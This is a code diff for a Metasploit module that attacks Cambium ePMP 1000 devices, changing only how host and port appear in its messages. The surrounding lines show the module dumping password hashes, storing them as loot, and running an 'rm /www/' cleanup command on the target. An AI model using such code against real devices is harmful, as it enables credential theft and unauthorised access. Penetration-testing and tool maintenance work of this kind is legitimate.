@@ -111,10 +111,10 @@ class MetasploitModule < Msf::Auxiliary
       )
 
       if good_response
-        print_status("#{rhost}:#{rport} - Dumping password hashes")
+        print_status("#{Rex::Socket.to_authority(rhost, rport)} - Dumping password hashes")
 
         path = store_loot('ePMP_passwd', 'text/plain', rhost, res.body, 'Cambium ePMP 1000 password hashes')
-        print_status("#{rhost}:#{rport} - Hashes saved in: #{path}")
+        print_status("#{Rex::Socket.to_authority(rhost, rport)} - Hashes saved in: #{path}")
 
         # clean up the passwd file from /www/
         command = 'rm /www/' + random_filename
@@ -146,10 +146,10 @@ class MetasploitModule < Msf::Auxiliary
         )
       else
         check_file_uri = "#{(ssl ? 'https' : 'http')}" + '://' + "#{rhost}:#{rport}" + '/' + random_filename
-        print_error("#{rhost}:#{rport} - Could not retrieve hashes. Try manually by directly accessing #{check_file_uri}.")
+        print_error("#{Rex::Socket.to_authority(rhost, rport)} - Could not retrieve hashes. Try manually by directly accessing #{check_file_uri}.")
       end
     else
-      print_error("#{rhost}:#{rport} - Failed to dump hashes.")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Failed to dump hashes.")
     end
   end
 
